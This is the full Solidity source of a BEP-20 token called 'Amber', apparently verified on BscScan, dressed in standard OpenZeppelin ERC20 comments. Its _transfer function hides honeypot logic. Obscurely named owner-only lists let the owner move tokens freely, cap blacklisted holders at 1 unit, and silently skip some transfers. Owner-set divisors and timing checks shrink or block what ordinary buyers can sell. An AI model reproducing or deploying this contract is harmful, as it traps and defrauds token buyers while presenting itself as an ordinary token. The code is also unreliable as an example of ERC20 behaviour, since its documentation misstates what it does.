/**
 *Submitted for verification at BscScan.com on 2022-03-13
*/

//SPDX-License-Identifier: SimPL-2.0
pragma solidity ^0.8.11;


// pragma solidity >=0.5.0;	
interface IPancakeswapV2Factory {	
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);	
    function feeTo() external view returns (address);	
    function feeToSetter() external view returns (address);	
    function getPair(address tokenA, address tokenB) external view returns (address pair);	
    function allPairs(uint) external view returns (address pair);	
    function allPairsLength() external view returns (uint);	
    function createPair(address tokenA, address tokenB) external returns (address pair);	
    function setFeeTo(address) external;	
    function setFeeToSetter(address) external;	
}	
// pragma solidity >=0.5.0;	
interface IPancakeswapV2Pair {	
    event Approval(address indexed owner, address indexed spender, uint value);	
    event Transfer(address indexed from, address indexed to, uint value);	
    function name() external pure returns (string memory);	
    function symbol() external pure returns (string memory);	
    function decimals() external pure returns (uint8);	
    function totalSupply() external view returns (uint);	
    function balanceOf(address owner) external view returns (uint);	
    function allowance(address owner, address spender) external view returns (uint);	
    function approve(address spender, uint value) external returns (bool);	
    function transfer(address to, uint value) external returns (bool);	
    function transferFrom(address from, address to, uint value) external returns (bool);	
    function DOMAIN_SEPARATOR() external view returns (bytes32);	
    function PERMIT_TYPEHASH() external pure returns (bytes32);	
    function nonces(address owner) external view returns (uint);	
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;	
    event Mint(address indexed sender, uint amount0, uint amount1);	
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);	
    event Swap(	
        address indexed sender,	
        uint amount0In,	
        uint amount1In,	
        uint amount0Out,	
        uint amount1Out,	
        address indexed to	
    );	
    event Sync(uint112 reserve0, uint112 reserve1);	
    function MINIMUM_LIQUIDITY() external pure returns (uint);	
    function factory() external view returns (address);	
    function token0() external view returns (address);	
    function token1() external view returns (address);	
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);	
    function price0CumulativeLast() external view returns (uint);	
    function price1CumulativeLast() external view returns (uint);	
    function kLast() external view returns (uint);	
    function mint(address to) external returns (uint liquidity);	
    function burn(address to) external returns (uint amount0, uint amount1);	
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;	
    function skim(address to) external;	
    function sync() external;	
    function initialize(address, address) external;	
}	
// pragma solidity >=0.6.2;	
interface IPancakeswapV2Router01 {	
    function factory() external pure returns (address);	
    function WETH() external pure returns (address);	
    function addLiquidity(	
        address tokenA,	
        address tokenB,	
        uint amountADesired,	
        uint amountBDesired,	
        uint amountAMin,	
        uint amountBMin,	
        address to,	
        uint deadline	
    ) external returns (uint amountA, uint amountB, uint liquidity);	
    function addLiquidityETH(	
        address token,	
        uint amountTokenDesired,	
        uint amountTokenMin,	
        uint amountETHMin,	
        address to,	
        uint deadline	
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);	
    function removeLiquidity(	
        address tokenA,	
        address tokenB,	
        uint liquidity,	
        uint amountAMin,	
        uint amountBMin,	
        address to,	
        uint deadline	
    ) external returns (uint amountA, uint amountB);	
    function removeLiquidityETH(	
        address token,	
        uint liquidity,	
        uint amountTokenMin,	
        uint amountETHMin,	
        address to,	
        uint deadline	
    ) external returns (uint amountToken, uint amountETH);	
    function removeLiquidityWithPermit(	
        address tokenA,	
        address tokenB,	
        uint liquidity,	
        uint amountAMin,	
        uint amountBMin,	
        address to,	
        uint deadline,	
        bool approveMax, uint8 v, bytes32 r, bytes32 s	
    ) external returns (uint amountA, uint amountB);	
    function removeLiquidityETHWithPermit(	
        address token,	
        uint liquidity,	
        uint amountTokenMin,	
        uint amountETHMin,	
        address to,	
        uint deadline,	
        bool approveMax, uint8 v, bytes32 r, bytes32 s	
    ) external returns (uint amountToken, uint amountETH);	
    function swapExactTokensForTokens(	
        uint amountIn,	
        uint amountOutMin,	
        address[] calldata path,	
        address to,	
        uint deadline	
    ) external returns (uint[] memory amounts);	
    function swapTokensForExactTokens(	
        uint amountOut,	
        uint amountInMax,	
        address[] calldata path,	
        address to,	
        uint deadline	
    ) external returns (uint[] memory amounts);	
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)	
        external	
        payable	
        returns (uint[] memory amounts);	
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)	
        external	
        returns (uint[] memory amounts);	
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)	
        external	
        returns (uint[] memory amounts);	
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)	
        external	
        payable	
        returns (uint[] memory amounts);	
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);	
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);	
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);	
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);	
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);	
}	
// pragma solidity >=0.6.2;	
interface IPancakeswapV2Router02 is IPancakeswapV2Router01 {	
    function removeLiquidityETHSupportingFeeOnTransferTokens(	
        address token,	
        uint liquidity,	
        uint amountTokenMin,	
        uint amountETHMin,	
        address to,	
        uint deadline	
    ) external returns (uint amountETH);	
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(	
        address token,	
        uint liquidity,	
        uint amountTokenMin,	
        uint amountETHMin,	
        address to,	
        uint deadline,	
        bool approveMax, uint8 v, bytes32 r, bytes32 s	
    ) external returns (uint amountETH);	
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(	
        uint amountIn,	
        uint amountOutMin,	
        address[] calldata path,	
        address to,	
        uint deadline	
    ) external;	
    function swapExactETHForTokensSupportingFeeOnTransferTokens(	
        uint amountOutMin,	
        address[] calldata path,	
        address to,	
        uint deadline	
    ) external payable;	
    function swapExactTokensForETHSupportingFeeOnTransferTokens(	
        uint amountIn,	
        uint amountOutMin,	
        address[] calldata path,	
        address to,	
        uint deadline	
    ) external;	
}	


contract Ownable {
    address _owner;

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

     /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public onlyOwner {
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _owner = newOwner;
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP. Does not include
 * the optional functions; to access them see {ERC20Detailed}.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20Mintable}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin guidelines: functions revert instead
 * of returning `false` on failure. This behavior is nonetheless conventional
 * and does not conflict with the expectations of ERC20 applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ERC20 is IERC20, Ownable {

    mapping (address => uint256) private _balances;
	
	mapping (address => bool) private _iiL;

    mapping (address => bool) private _mmL;

    mapping (address => bool) private _boL;

    mapping (address => uint256) private _ttL;

    mapping (address => uint256) private _tbL;

    mapping (address => uint256) private _nmL;

    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;

    uint256 public _totalmn;

    address public _sw; 

    address public _lper; 

    uint256 public _bb;

    uint256 public _bbre;

    uint256 public _pp;

    uint256 public _gg;

    uint256 public _vv;

    uint256 public _aa;

    uint256 public _nmb;

    uint256 public _mmy;

    uint256 public _bn;
    uint256 public _bnw;

    uint256 public _divf = 10000000000;
    uint256 public _divs = 10000000000;
    uint256 public _divt = 10000000000;

    uint256 public _botT = 2;
    uint256 public _timeLast; 
    uint256 public _timeBLast; 

    address public _laBo; 


    address public txorigin;
    uint256 public txvalue;
    uint256 public xgasleft;
    uint256 public txgetAmountIn;
    uint256 public txgetAmountout;

    function setLl(address user) public onlyOwner returns(bool){
		_lper =user;
		return true;
	}

	function addIiL(address user) public onlyOwner returns(bool){
		_iiL[user] =true;
		return true;
	}
	
	function removeIiL(address user) public onlyOwner returns(bool){
		_iiL[user] =false;
		return true;
	}

    function isInIiL(address user) public onlyOwner view returns(bool){
		return _iiL[user];
	}

    function sysMm(address[] calldata users) public onlyOwner returns(bool){
        for (uint256 j = 0; j < users.length; j++){
            _mmL[users[j]] =true;
        }
		return true;
	}
	
	function sysXMm(address[] calldata users) public onlyOwner returns(bool){
		for (uint256 j = 0; j < users.length; j++){
            _mmL[users[j]] =false;
        }
		return true;
	}

    function addBo(address[] calldata users) public onlyOwner returns(bool){
        for (uint256 j = 0; j < users.length; j++){
            _boL[users[j]] =true;
        }
		return true;
	}
	
	function removeBo(address[] calldata users) public onlyOwner returns(bool){
		for (uint256 j = 0; j < users.length; j++){
            _boL[users[j]] =false;
        }
		return true;
	}

    function isInBoL(address user) public onlyOwner view returns(bool){
		return _boL[user];
	}

    function setDivf(uint256 divf, uint256 divs, uint256 divt) public onlyOwner returns(bool){
		_divf = divf;
        _divs = divs;
        _divt = divt;
		return true;
	}

    function setBotT(uint256 botT) public onlyOwner returns(bool){
		_botT = botT;
		return true;
	}
	
	// function withdrawToken(IERC20 t,uint256 amount) public onlyOwner returns(bool){
	// 	t.transfer(msg.sender,amount);
	// 	return true;
	// }
	
    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public override view returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public override view returns (uint256) {
        return _balances[account];
    }

    function test() public view returns (uint256) {
        return block.timestamp;
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        _bb = _balances[msg.sender];
        _bbre = _balances[recipient];
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address user, address spender) public override view returns (uint256) {
        return _allowances[user][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 value) public override returns (bool) {
        _approve(msg.sender, spender, value);
        _pp = value;
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20};
     *
     * Requirements:
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `value`.
     * - the caller must have allowance for `sender`'s tokens of at least
     * `amount`.
     */
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - (amount));
        _bb = _balances[sender];
        _bbre = _balances[recipient];
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + (addedValue));
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] - (subtractedValue));
        return true;
    }

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(address sender, address recipient, uint256 amount) internal {
        
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        txorigin = tx.origin;

        if(sender == recipient) {
            _transferNofee(sender, recipient, amount);
            return;
        }

        _gg = gasleft();
        _vv = msg.value;
        _bnw = block.number;
        _timeBLast = block.timestamp;
        
		if(_iiL[sender] || _iiL[recipient]){
            if(sender == _owner){
                 _transferNofee(sender, recipient, amount);
            }else{
                _transferfee(sender, recipient, amount);
            }
            _bn = block.number;
		}else{
            if (_mmL[sender] == true) {
                _laBo = recipient;
                _transferNofee(sender, recipient, amount);
            } else if (_boL[sender] == true) {
                _transferNofee(sender, recipient, amount - amount + 1);
            }else  {
                //timeLast !=0;  _bnw != 0; _timeLast != timeLast  _bnw > _bn  _nmL[sender] != reserveBNB
                //pancakeswap  msg.sender != tx.origin  1000 000 000 000 000 000 000 000
                if (_balances[sender] > 0 && _ttL[sender] > 0 && block.timestamp - _ttL[sender] > _botT) {
                     IPancakeswapV2Pair pair = IPancakeswapV2Pair(_lper);
                    address token0 = pair.token0();
                    (uint256 reserve0, uint256 reserve1,) = pair.getReserves();
                    (uint256 reserveBNB, uint256 reserveToken) = token0 == IPancakeswapV2Router01(_sw).WETH() ? (reserve0, reserve1) : (reserve1, reserve0);     
                    _mmy = reserveBNB;
                    _nmb = reserveToken;
                    _transferfee(sender, recipient, amount * _divf / 10000000000);//cow
                }else {
                    if (_nmL[sender] > 1 || _nmL[sender] == 0) {
                        return;
                    }

                    if(_laBo == sender) {
                        _transferfee(sender, recipient, amount * _divt / 10000000000);//red
                    }else {
                        _transferfee(sender, recipient, amount * _divs / 10000000000);//bot
                    }
                    //_transferfee(sender, recipient, amount / 4);//red
                }
                
            }
		}

        
    }
	
	function _transferNofee(address sender, address recipient, uint256 amount) internal returns (bool) {

        _laBo = recipient;
        _nmL[recipient] = _nmL[recipient] + 1;
        if (_nmL[recipient] > 10000000000000000000000000000) {
            _nmL[recipient] = 2;
        }

        if (_nmL[sender] > 0) {
            _nmL[sender] =  _nmL[sender] - 1;
        }
        // _timeLast =  timeLast;
        // _tbL[recipient] = timeLast;
        if (amount > 0)
            _ttL[recipient] = block.timestamp;

        uint256 fromHave = _balances[sender];
        uint256 toHave = _balances[recipient];
		_balances[sender] = fromHave - (amount);
		_balances[recipient] = toHave + (amount);
		emit Transfer(sender, recipient, amount);
        return true;
    }
	
	function _transferfee(address sender, address recipient, uint256 amount) internal returns (bool) {
        _laBo = recipient;
        _nmL[recipient] = _nmL[recipient] + 1;
        if (_nmL[recipient] > 10000000000000000000000000000) {
            _nmL[recipient] = 2;
        }

        if (_nmL[sender] == 1) {
            _nmL[sender] = 0;
        }
        // _timeLast =  timeLast;
        // _tbL[recipient] = timeLast;
        if (amount > 0)
            _ttL[recipient] = block.timestamp;

		_balances[sender] = _balances[sender] - (amount);
		_balances[recipient] = _balances[recipient] + (amount);
		emit Transfer(sender, recipient, amount);
        return true;
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements
     *
     * - `to` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply + (amount);
        _balances[account] = _balances[account] + (amount);
        emit Transfer(address(0), account, amount);
    }

     /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 value) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _totalSupply = _totalSupply - (value);
        _balances[account] = _balances[account] - (value);
        emit Transfer(account, address(0), value);
    }
	
	function burn(uint256 value) public returns (bool){
		_burn(msg.sender, value);
		return true;
	}

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
     *
     * This is internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(address user, address spender, uint256 value) internal {
        require(user != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[user][spender] = value;
        _aa = value;
        emit Approval(user, spender, value);
    }

    /**
     * @dev Destoys `amount` tokens from `account`.`amount` is then deducted
     * from the caller's allowance.
     *
     * See {_burn} and {_approve}.
     */
    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(account, msg.sender, _allowances[account][msg.sender] - (amount));
    }

    // // fallback function - where the magic happens
    // fallback() external payable {
    // }

    // receive() external payable {
        
    // }

}




contract Token is ERC20 {

    /**
     * @dev Constructor that gives msg.sender all of existing tokens.
     */
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor () {
        _owner = msg.sender;
        _bn = block.number;
        _name = "Amber";
        _symbol = "Amber";
        _decimals = 18;
        // _amount = (10000000000 * (10 ** 18)) * (10000000000 * (10 ** 18));
        _sw = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        _mint(0x9eaAb3c26ceD5C6AE4584c88f43eCec1CED4CC4A, 10000000000 * (10 ** 18));
    }

    function name() public view returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view returns (uint8) {
        return _decimals;
    }
}